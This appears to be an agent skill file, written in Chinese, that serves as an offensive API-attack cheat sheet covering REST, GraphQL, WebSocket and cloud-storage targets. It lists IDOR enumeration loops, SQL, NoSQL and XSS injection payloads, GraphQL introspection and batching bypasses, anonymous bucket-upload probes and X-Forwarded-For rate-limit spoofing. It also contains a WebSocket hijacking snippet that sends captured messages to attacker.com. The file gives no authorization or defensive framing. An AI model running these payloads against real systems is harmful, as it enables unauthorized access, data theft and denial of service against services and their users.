---
name: api安全攻击
description: Use when encountering rest/graphql/websocket/云存储api安全攻击技术
---

# API安全攻击

## Info

- **Domain**: api
- **Tags**: api, rest, graphql, websocket, cloud-storage

## 攻击思路
```
API资产发现 → 漏洞检测 → 认证/授权绕过 → 数据获取/注入攻击 → 提权/RCE
```

## API资产发现矩阵

| 发现方式 | 工具 | 目标 |
|----------|------|------|
| JS文件分析 | JSLinkFinder | API端点/参数 |
| Swagger解析 | swagger-parser | API规范 |
| 流量拦截 | Burp Suite | XHR/Fetch请求 |
| 目录枚举 | ffuf | /api/v1/, /graphql |
| 爬虫扫描 | Arjun | API参数发现 |

```bash
# JS分析提取API
python JSLinkFinder.py -i http://target/main.js -o cli

# 参数发现
arjun -u http://target/api/user -m GET,POST
```

## 漏洞检测矩阵

| 漏洞类型 | 检测方法 | Payload示例 |
|----------|----------|-------------|
| 未授权访问 | 移除认证头 | 移除Authorization |
| IDOR越权 | 参数替换 | /api/users/1 → /api/users/2 |
| SQL注入 | 参数注入 | ?name=admin'-- |
| NoSQL注入 | JSON注入 | {"name":{"$ne":"admin"}} |
| 批量赋值 | 隐藏字段注入 | {"role":"admin"} |
| 速率限制 | 高频请求 | 快速重复请求 |

## IDOR越权攻击矩阵

| 越权类型 | 攻击方式 | 绕过方法 |
|----------|----------|----------|
| 水平越权 | /api/users/ID → ID变更 | 数字递增/UUID枚举 |
| 垂直越权 | user → admin接口 | 权限字段修改 |
| 批量越权 | ids[]数组注入 | ids[]=1,2,3,4,5 |
| GUID预测 | UUID模式分析 | 时间戳/随机数预测 |

```bash
# 批量IDOR测试
for i in $(seq 1 100); do
  curl -H "Authorization: Bearer $token" "http://target/api/users/$i"
done

# 数字变体绕过
/api/users/1 → /api/users/001 → /api/users/1.0 → /api/users/0x01
```

## GraphQL攻击

| 攻击类型 | Payload | 目标 |
|----------|---------|------|
| 内省泄露 | {__schema{types{name}}} | Schema获取 |
| 字段枚举 | {__type(name:"User"){fields{name}}} | 隐藏字段 |
| 批量查询 | 多别名查询 | 限频绕过 |
| 深度嵌套 | 嵌套查询 | DoS攻击 |
| Mutation滥用 | 未授权写入 | 数据篡改 |

```graphql
# 内省绕过
query { ...IntrospectionQuery }

# 批量查询绕过限频
query {
  u1: user(id:1) { name }
  u2: user(id:2) { name }
  ...
  u100: user(id:100) { name }
}
```

## 云存储攻击

| 云厂商 | 特征域名 | 漏洞检测 |
|--------|----------|----------|
| 阿里云OSS | *.oss-*.aliyuncs.com | 公开访问/匿名上传 |
| 腾讯云COS | *.cos.myqcloud.com | ACL配置错误 |
| AWS S3 | *.s3.amazonaws.com | Buckets枚举 |
| 华为云OBS | *.obs.myhwclouds.com | 权限配置 |
| MinIO | :9000/:9001 | 默认凭证 |

```bash
# OSS公开访问检测
curl http://bucket.oss-cn-hangzhou.aliyuncs.com/

# 匿名上传测试
curl -X PUT http://bucket.oss-*.aliyuncs.com/test.txt -d "test"
```

## WebSocket攻击

| 攻击类型 | Payload | 目标 |
|----------|---------|------|
| 跨站劫持 | 恶意Origin | 数据窃取 |
| CSRF | 自动发送消息 | 敏感操作 |
| 注入攻击 | XSS/SQL/SSTI | 消息内容注入 |
| 信息泄露 | 枚举消息类型 | 敏感数据 |
| DoS | 快速大量消息 | 服务拒绝 |

```javascript
// WebSocket劫持
var ws = new WebSocket('wss://target/ws');
ws.onmessage = function(e) {
  fetch('https://attacker.com/log?data='+encodeURIComponent(e.data));
};

// 消息注入
ws.send('<script>alert(1)</script>');
ws.send("'; DROP TABLE users;--");
```

## 速率限制绕过

| 绕过方法 | Header | 示例 |
|----------|--------|------|
| IP轮换 | X-Forwarded-For | X-Forwarded-For: 10.0.0.$i |
| Header污染 | X-Real-IP | X-Real-IP: 1.1.1.1 |
| 分布式请求 | 多代理 | 不同IP并发 |
| 参数污染 | 重复参数 | param=1&param=2 |

```bash
# IP轮换绕过限频
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" http://target/api/test
done
```